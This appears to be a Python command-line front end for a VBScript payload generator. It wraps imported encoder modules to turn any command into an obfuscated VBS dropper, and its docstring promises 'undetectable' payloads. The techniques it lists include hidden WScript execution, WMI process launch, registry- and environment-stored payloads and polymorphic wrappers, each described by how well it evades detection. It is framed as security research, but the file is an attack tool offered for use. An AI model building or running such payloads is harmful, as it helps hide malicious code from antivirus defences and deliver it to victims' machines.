#!/usr/bin/env python3
"""
Unified Payload Generator for VBS Encryption
Provides clean, easy-to-use API for generating undetectable VBS payloads
"""

from vbs_encoder import VBSEncoder, generate_clean_vbs_payload, ObfuscationConfig
from vbs_advanced_obfuscation import create_stealthy_payload
from typing import Optional, List
import argparse
import sys


class PayloadGenerator:
    """Main interface for generating payloads"""

    def __init__(self):
        self.encoder = VBSEncoder()
        self.techniques = [
            "basic",
            "base64",
            "hex",
            "array",
            "wmi",
            "registry",
            "env",
            "com",
            "obfuscated_calls",
            "filewriter",
            "multi_encoding",
            "hidden_execution",
        ]

    def generate(
        self, command: str, technique: str = "base64", obfuscation_level: str = "high"
    ) -> str:
        """
        Generate VBS payload using specified technique

        Args:
            command: Command to execute
            technique: Obfuscation technique to use
            obfuscation_level: "low", "medium", "high"

        Returns:
            VBS payload code
        """

        if technique == "basic":
            return self.encoder.create_wscript_hidden_execution(command)

        elif technique == "base64":
            return self.encoder.create_full_obfuscated_payload(command, "base64")

        elif technique == "hex":
            return self.encoder.create_full_obfuscated_payload(command, "hex")

        elif technique == "array":
            return self.encoder.create_full_obfuscated_payload(command, "array")

        elif technique in ["wmi", "registry", "env", "com", "obfuscated_calls", "filewriter", "multi_encoding"]:
            return create_stealthy_payload(command, technique)

        elif technique == "hidden_execution":
            payload = generate_clean_vbs_payload(command, obfuscation_level)
            if obfuscation_level == "high":
                return self.encoder.create_polymorphic_wrapper(payload)
            return payload

        else:
            raise ValueError(f"Unknown technique: {technique}")

    def list_techniques(self) -> List[str]:
        """List all available techniques"""
        return self.techniques

    def get_technique_info(self, technique: str) -> str:
        """Get description of a technique"""
        descriptions = {
            "basic": "Simple WScript.Shell execution (minimal obfuscation)",
            "base64": "Base64 encoding with MSXML decoder (standard stealth)",
            "hex": "Hex encoding with Chr() decoder (good obfuscation)",
            "array": "Array-based hex encoding (moderate stealth)",
            "wmi": "WMI-based process execution (less detected than Shell)",
            "registry": "Payload stored in registry, assembled at runtime",
            "env": "Payload hidden in environment variables",
            "com": "Various COM objects to avoid signature detection",
            "obfuscated_calls": "Function names built via string concatenation",
            "filewriter": "Write command to temp file, execute via cmd",
            "multi_encoding": "Multiple encoding layers for maximum obfuscation",
            "hidden_execution": "Wrapped payload with polymorphic obfuscation",
        }
        return descriptions.get(technique, "Unknown technique")


def main():
    parser = argparse.ArgumentParser(
        description="VBS Payload Generator for Security Research",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python payload_generator.py -c "powershell.exe -Command 'Write-Host test'" --technique base64
  python payload_generator.py -c "cmd /c echo test" --technique wmi --obfuscation high
  python payload_generator.py --list-techniques
  python payload_generator.py --technique-info wmi
        """,
    )

    parser.add_argument(
        "-c",
        "--command",
        help="Command to encode in VBS payload",
    )
    parser.add_argument(
        "-t",
        "--technique",
        default="base64",
        help="Obfuscation technique (see --list-techniques)",
    )
    parser.add_argument(
        "-o",
        "--obfuscation",
        default="high",
        choices=["low", "medium", "high"],
        help="Obfuscation level",
    )
    parser.add_argument(
        "--list-techniques",
        action="store_true",
        help="List all available techniques",
    )
    parser.add_argument(
        "--technique-info",
        metavar="TECHNIQUE",
        help="Get detailed info about a technique",
    )
    parser.add_argument(
        "-f",
        "--file",
        help="Save output to file",
    )

    args = parser.parse_args()

    generator = PayloadGenerator()

    if args.list_techniques:
        print("Available VBS Obfuscation Techniques:")
        print("-" * 50)
        for tech in generator.list_techniques():
            print(f"  {tech:<20} - {generator.get_technique_info(tech)}")
        return

    if args.technique_info:
        print(f"Technique: {args.technique_info}")
        print(f"Description: {generator.get_technique_info(args.technique_info)}")
        return

    if not args.command:
        print("Error: --command required (unless using --list-techniques)")
        parser.print_help()
        sys.exit(1)

    # Generate payload
    try:
        payload = generator.generate(
            args.command, args.technique, args.obfuscation
        )

        if args.file:
            with open(args.file, "w") as f:
                f.write(payload)
            print(f"[+] Payload written to {args.file}")
        else:
            print(payload)

    except Exception as e:
        print(f"Error generating payload: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
